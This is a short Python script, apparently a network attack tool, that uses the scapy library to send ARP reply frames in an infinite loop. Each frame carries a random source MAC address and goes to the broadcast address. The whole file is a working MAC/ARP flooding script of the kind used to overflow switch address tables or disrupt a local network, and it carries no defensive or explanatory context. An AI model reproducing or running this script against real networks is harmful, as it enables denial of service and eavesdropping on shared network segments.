from scapy.all import *

# Infinite loop to continuously send packets
while True:
    sendp(
        Ether(src=RandMAC(), dst="FF:FF:FF:FF:FF:FF") /
        ARP(op=2, psrc="0.0.0.0", hwdst="FF:FF:FF:FF:FF:FF") /
        Padding(load="X" * 18),
        verbose=False
    )
